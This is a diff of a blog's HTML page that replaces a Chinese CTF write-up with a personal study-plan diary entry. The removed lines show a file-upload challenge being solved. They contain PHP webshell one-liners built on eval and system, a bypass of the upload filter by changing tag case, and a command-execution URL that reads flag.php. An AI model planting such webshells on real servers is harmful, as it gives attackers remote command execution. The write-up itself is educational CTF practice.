@@ -61,26 +61,16 @@
 
 <meta name="description" content="点击阅读全文">
 <meta property="og:type" content="article">
-<meta property="og:title" content="百度杯CTF比赛Writeup">
-<meta property="og:url" content="http://uknow.top/posts/ctf/百度杯CTF比赛Writeup.html">
+<meta property="og:title" content="2016-10-19">
+<meta property="og:url" content="http://uknow.top/posts/life/2016-10-19">
 <meta property="og:site_name" content="Uknow’s Blog">
 <meta property="og:description" content="点击阅读全文">
-<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/psb.jpg">
-<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160903224648.png">
-<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160903224800.png">
-<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160903225057.png">
-<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160903225859.png">
-<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160903230202.png">
-<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8721.png">
-<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8717.png">
-<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160903231450.png">
-<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8717.png">
-<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160903232502.png">
-<meta property="og:updated_time" content="2016-11-19T04:49:24.682Z">
+<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20161019235139.jpg">
+<meta property="og:updated_time" content="2016-11-19T04:49:39.582Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="百度杯CTF比赛Writeup">
+<meta name="twitter:title" content="2016-10-19">
 <meta name="twitter:description" content="点击阅读全文">
-<meta name="twitter:image" content="http://obr4sfdq7.bkt.clouddn.com/psb.jpg">
+<meta name="twitter:image" content="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20161019235139.jpg">
 
 
 
@@ -98,7 +88,7 @@
   };
 </script>
 
-  <title> 百度杯CTF比赛Writeup | Uknow’s Blog </title>
+  <title> 2016-10-19 | Uknow’s Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -261,7 +251,7 @@
             
             
               
-                百度杯CTF比赛Writeup
+                2016-10-19
               
             
           </h1>
@@ -273,8 +263,8 @@
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-09-03T22:43:52+08:00" content="2016-09-03">
-              2016-09-03
+            <time itemprop="dateCreated" datetime="2016-10-19T23:13:40+08:00" content="2016-10-19">
+              2016-10-19
             </time>
           </span>
 
@@ -287,8 +277,8 @@
               <span class="post-meta-item-text">分类于</span>
               
                 <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/ctf/" itemprop="url" rel="index">
-                    <span itemprop="name">CTF</span>
+                  <a href="/categories/life/" itemprop="url" rel="index">
+                    <span itemprop="name">生活</span>
                   </a>
                 </span>
 
@@ -303,8 +293,8 @@
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/posts/ctf/百度杯CTF比赛Writeup.html#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="posts/ctf/百度杯CTF比赛Writeup.html" itemprop="commentsCount"></span>
+                <a href="/posts/life/2016-10-19#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="posts/life/2016-10-19" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -314,7 +304,7 @@
 
           
           
-             <span id="/posts/ctf/百度杯CTF比赛Writeup.html" class="leancloud_visitors" data-flag-title="百度杯CTF比赛Writeup">
+             <span id="/posts/life/2016-10-19" class="leancloud_visitors" data-flag-title="2016-10-19">
                &nbsp; | &nbsp;
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -336,23 +326,36 @@
 
       
         <p>点击阅读全文<br><a id="more"></a></p>
-<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>i春秋和百度联合推出的一个CTF比赛，由于本人太菜。只能随便玩玩，多学多问。<br><img src="http://obr4sfdq7.bkt.clouddn.com/psb.jpg" alt=""></p>
-<h2 id="0x01-正文"><a href="#0x01-正文" class="headerlink" title="0x01 正文"></a>0x01 正文</h2><h3 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>Upload<br>描述：想怎么传就怎么传，就是这么任性。<br>tips:flag在flag.php中    </p>
-<h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>打开题目题目链接，是一个文件上传的题。<br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160903224648.png" alt=""><br>然后打开/flag.php<br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160903224800.png" alt=""><br>直接上传传统的PHP一句话<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php eval_r($_POST[sb])?&gt;</div></pre></td></tr></table></figure></p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160903225057.png" alt=""><br>发现过滤了 &lt;?php</p>
-<p>然后在网上找到了另一种php一句话的木马<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script language=&quot;php&quot;&gt;@eval_r($_POST[sb])&lt;/script&gt; //绕过&lt;?限制的一句话</div></pre></td></tr></table></figure></p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160903225859.png" alt=""><br>查看源码显示过滤了php</p>
-<p>php改为PHP继续上传<br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160903230202.png" alt=""><br>查看源码没有显示</p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8721.png" alt=""><br>找这里就没思路了，吃饭。去图书馆，下午回来问问大表哥</p>
-<p>表哥告诉我不要传传统的PHP一句话<br>换个姿势，然后告诉我 PHP有4种开始和结束标记<br><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8717.png" alt=""><br>果断百度<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">1.</div><div class="line">&lt;?php echo &apos;if you want to serve XHTML or XML documents, do like this&apos;; ?&gt;</div><div class="line"></div><div class="line">2.</div><div class="line">&lt;script language=&quot;php&quot;&gt;</div><div class="line">echo &apos;some editors (like FrontPage) don&apos;t</div><div class="line">like processing instructions&apos;;</div><div class="line">&lt;/script&gt;</div><div class="line"></div><div class="line">3.</div><div class="line">&lt;? echo &apos;this is the simplest, an SGML processing instruction&apos;; ?&gt;</div><div class="line">&lt;?= expression ?&gt; This is a shortcut for &quot;&lt;? echo expression ?&gt;&quot;</div><div class="line"></div><div class="line">4.</div><div class="line">&lt;% echo &apos;You may optionally use ASP-style tags&apos;; %&gt;</div><div class="line">&lt;%= $variable; # This is a shortcut for &quot;&lt;% echo . . .&quot; %&gt;</div></pre></td></tr></table></figure></p>
-<p>发现第二种上午用过，但是不行<br>表哥说换个姿势，用system()函数调用系统命令<br>由于个人能力太差，写了半天才写出一句话<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script language=&quot;PHP&quot;&gt;system($_GET[id])&lt;/script&gt;</div></pre></td></tr></table></figure></p>
-<p>PHP大写绕过，上传！<br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160903231450.png" alt=""><br>执行3.php?id=ls<br>发现php_errors.log日志文件，找到表哥说的绝对路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/var/www/html/u</div></pre></td></tr></table></figure></p>
-<p>然后表哥说直接命令查就可以了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pwd  //同样得到 /var/www/html/u</div></pre></td></tr></table></figure></p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8717.png" alt=""><br>然后利用cat 查看文件内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">1．命令格式：</div><div class="line"></div><div class="line">cat [选项] [文件]...</div><div class="line"></div><div class="line">2．命令功能：</div><div class="line"></div><div class="line">cat主要有三大功能：</div><div class="line"></div><div class="line">1.一次显示整个文件:cat filename</div><div class="line"></div><div class="line">2.从键盘创建一个文件:cat &gt; filename 只能创建新文件,不能编辑已有文件.</div><div class="line"></div><div class="line">3.将几个文件合并为一个文件:cat file1 file2 &gt; file</div><div class="line"></div><div class="line">3．命令参数：</div><div class="line"></div><div class="line">-A, --show-all           等价于 -vET</div><div class="line"></div><div class="line">-b, --number-nonblank    对非空输出行编号</div><div class="line"></div><div class="line">-e                       等价于 -vE</div><div class="line"></div><div class="line">-E, --show-ends          在每行结束处显示 $</div><div class="line"></div><div class="line">-n, --number     对输出的所有行编号,由1开始对所有输出的行数编号</div><div class="line"></div><div class="line">-s, --squeeze-blank  有连续两行以上的空白行，就代换为一行的空白行 </div><div class="line"></div><div class="line">-t                       与 -vT 等价</div><div class="line"></div><div class="line">-T, --show-tabs          将跳格字符显示为 ^I</div><div class="line"></div><div class="line">-u                       (被忽略)</div><div class="line"></div><div class="line">-v, --show-nonprinting   使用 ^ 和 M- 引用，除了 LFD 和 TAB 之外</div></pre></td></tr></table></figure></p>
-<p>根据上面的知识，构建下面的payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">.../u/3.php?id=cat /var/www/html/flag.php</div></pre></td></tr></table></figure></p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160903232502.png" alt=""><br>查看源码得到flag,唉！不容易，自己的知识太少了。</p>
-<h4 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h4><p>flag{90969a8b-9e19-4247-8654-a10eeeb48314}</p>
-<h4 id="此题小结"><a href="#此题小结" class="headerlink" title="此题小结"></a>此题小结</h4><p>才发现做个CTF不是那么容易的，一个看起来简单的上传绕过的题目。包含了PHP，Linxu系统命令，等等很多内容。也发现了自己有很多不足。幸亏有表哥的帮助，在此感觉依风表哥帮助和指导，下面两个题等明天在看别人的Writeup或者请教表哥吧！</p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>距上次写博客差不多20多天了，最近也是挺忙的。没时间写博客，专业作业，另外还有的安排、研究院的小组学习任务。没有怎么更新。</p>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>最近在给自己养成一些好的习惯吧！前段时间作息时间有点乱，然后就是作息时间乱，引起各种病痛，缺少体育锻炼吧！尽量早点睡觉，早点起床吧！另外就是学校的学习和自己的个人的学习问题了，感觉很冲突，来不及转换。专业学习的任务还是有这么重的，但是再怎么也不会丢下自己的个人学习。JavaScript还是要在计划中学完吧，然后再自己搞几个小项目实践下。这几天每次去图书馆都屁颠屁颠的往新书架跑，看我荐购的图书有没有上架。可是每次都没上，这是最骚。然后就是下次来了再看看吧。再给自己定一个小小的计划吧！</p>
+<table>
+<thead>
+<tr>
+<th>事件</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>学校作业</td>
+</tr>
+<tr>
+<td>每日敲几个C++书上的例题</td>
+</tr>
+<tr>
+<td>记英语单词</td>
+</tr>
+<tr>
+<td>偶尔跟同学去下跑跑步</td>
+</tr>
+<tr>
+<td>JavaScript学习</td>
+</tr>
+</tbody>
+</table>
+<p>这些就是这段时间的计划了吧，体育锻炼什么的还是要有的。另外不能落下的就不落下吧。</p>
+<p>我经常和同学和朋友说，我不想这四年就这么混过去。用我爸的话就是：如果你要混，那就早点放弃。别浪费时间和金钱。这个观念之前没有在意的。但是到了大学，我却把这句话牢牢的记在了心里。我不想这四年就这么白白的混过去，大学并不是之前高中老师曾经说的大学就解放了。混四年，毕业找不到工作，回家啃老？我并不想以后这样。如果我觉得我真的读这四年以后找不到工作，没有什么用处的话，我是真的会选择放弃。所以，现在好好的做好自己，把自己计划的事，自己感兴趣的事情一直进行下去，莫负韵华。</p>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>以此给自己一个提醒，做好自己！</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20161019235139.jpg" alt=""></p>
 
       
     </div>
@@ -370,16 +373,16 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/posts/notes/MySQL数据库基础与实例.html" rel="next" title="MySQL数据库基础与实例">
-                <i class="fa fa-chevron-left"></i> MySQL数据库基础与实例
+              <a href="/posts/skill/如何在Github-Pages搭建自己写的页面？" rel="next" title="如何在Github Pages搭建自己写的页面？">
+                <i class="fa fa-chevron-left"></i> 如何在Github Pages搭建自己写的页面？
               </a>
             
           </div>
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/posts/notes/Linux基础入门笔记.html" rel="prev" title="Linux基础入门笔记">
-                Linux基础入门笔记 <i class="fa fa-chevron-right"></i>
+              <a href="/posts/notes/智能社：JavaScript教程-从入门到精通视频整理笔记" rel="prev" title="智能社：JavaScript教程-从入门到精通视频整理笔记">
+                智能社：JavaScript教程-从入门到精通视频整理笔记 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -429,8 +432,8 @@
           
   <div class="comments" id="comments">
     
-      <div class="ds-thread" data-thread-key="posts/ctf/百度杯CTF比赛Writeup.html"
-           data-title="百度杯CTF比赛Writeup" data-url="http://uknow.top/posts/ctf/百度杯CTF比赛Writeup.html">
+      <div class="ds-thread" data-thread-key="posts/life/2016-10-19"
+           data-title="2016-10-19" data-url="http://uknow.top/posts/life/2016-10-19">
       </div>
     
   </div>
@@ -552,7 +555,7 @@
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-正文"><span class="nav-number">2.</span> <span class="nav-text">0x01 正文</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Upload"><span class="nav-number">2.1.</span> <span class="nav-text">Upload</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#题目"><span class="nav-number">2.1.1.</span> <span class="nav-text">题目</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#解题思路"><span class="nav-number">2.1.2.</span> <span class="nav-text">解题思路</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Flag"><span class="nav-number">2.1.3.</span> <span class="nav-text">Flag</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#此题小结"><span class="nav-number">2.1.4.</span> <span class="nav-text">此题小结</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#正文"><span class="nav-number">2.</span> <span class="nav-text">正文</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#结语"><span class="nav-number">3.</span> <span class="nav-text">结语</span></a></li></ol></div>
             
           </div>
         </section>
